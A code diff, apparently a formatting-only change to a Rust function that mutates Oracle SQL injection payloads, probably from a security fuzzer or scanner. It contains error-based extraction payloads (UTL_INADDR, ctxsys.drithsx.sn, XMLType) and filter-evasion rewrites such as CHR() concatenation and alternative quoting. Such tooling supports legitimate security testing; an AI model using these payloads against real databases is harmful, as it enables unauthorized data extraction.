@@ -27,9 +27,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     // ── Error-based extraction ──
     results.push("SELECT ctxsys.drithsx.sn(1,(SELECT user FROM DUAL)) FROM DUAL".into());
     // UTL_INADDR error-based — resolves hostname, errors with data in message
-    results.push(
-        "SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)) FROM DUAL".into(),
-    );
+    results.push("SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)) FROM DUAL".into());
 
     // ── CHR() concatenation (Oracle uses ||) ──
     if lower.contains("char(") {
@@ -37,42 +35,42 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     }
     // Build string from CHR() chain
     if let Some(start) = payload.find('\'')
-        && let Some(end) = payload[start + 1..].find('\'') {
-            let inner = &payload[start + 1..start + 1 + end];
-            if !inner.is_empty() && inner.len() <= 15 && results.len() < max_mutations {
-                let chr_chain: String = inner
-                    .chars()
-                    .map(|c| format!("CHR({})", c as u32))
-                    .collect::<Vec<_>>()
-                    .join("||");
-                results.push(format!(
-                    "{}{}{}",
-                    &payload[..start],
-                    chr_chain,
-                    &payload[start + 1 + end + 1..]
-                ));
-            }
+        && let Some(end) = payload[start + 1..].find('\'')
+    {
+        let inner = &payload[start + 1..start + 1 + end];
+        if !inner.is_empty() && inner.len() <= 15 && results.len() < max_mutations {
+            let chr_chain: String = inner
+                .chars()
+                .map(|c| format!("CHR({})", c as u32))
+                .collect::<Vec<_>>()
+                .join("||");
+            results.push(format!(
+                "{}{}{}",
+                &payload[..start],
+                chr_chain,
+                &payload[start + 1 + end + 1..]
+            ));
         }
+    }
 
     // ── Alternative quoting syntax: q'[string]' ──
     if let Some(start) = payload.find('\'')
-        && let Some(end) = payload[start + 1..].find('\'') {
-            let inner = &payload[start + 1..start + 1 + end];
-            if !inner.is_empty() && results.len() < max_mutations {
-                results.push(format!(
-                    "{}q'[{}]'{}",
-                    &payload[..start],
-                    inner,
-                    &payload[start + 1 + end + 1..]
-                ));
-            }
+        && let Some(end) = payload[start + 1..].find('\'')
+    {
+        let inner = &payload[start + 1..start + 1 + end];
+        if !inner.is_empty() && results.len() < max_mutations {
+            results.push(format!(
+                "{}q'[{}]'{}",
+                &payload[..start],
+                inner,
+                &payload[start + 1 + end + 1..]
+            ));
         }
+    }
 
     // ── XMLType for data extraction ──
     if results.len() < max_mutations {
-        results.push(
-            "SELECT XMLType((SELECT user FROM DUAL)) FROM DUAL".into(),
-        );
+        results.push("SELECT XMLType((SELECT user FROM DUAL)) FROM DUAL".into());
     }
 
     // ── CONNECT BY / START WITH for row generation ──
